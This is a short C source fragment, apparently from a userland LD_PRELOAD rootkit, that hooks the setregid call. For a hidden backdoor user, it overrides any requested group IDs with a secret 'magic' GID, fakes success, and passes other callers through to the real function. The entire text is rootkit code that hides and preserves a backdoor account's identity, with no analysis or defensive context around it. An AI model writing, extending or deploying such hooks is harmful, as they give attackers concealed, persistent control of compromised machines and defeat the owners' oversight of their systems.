int setregid(gid_t rgid, gid_t egid){
    hook(CSETREGID);
    if(is_bdusr()){
        gid_t magicgid = readgid();
        if(rgid != magicgid || egid != magicgid)
            call(CSETREGID, magicgid, magicgid);
        return 0;
    }
    return (long)call(CSETREGID, rgid, egid);
}
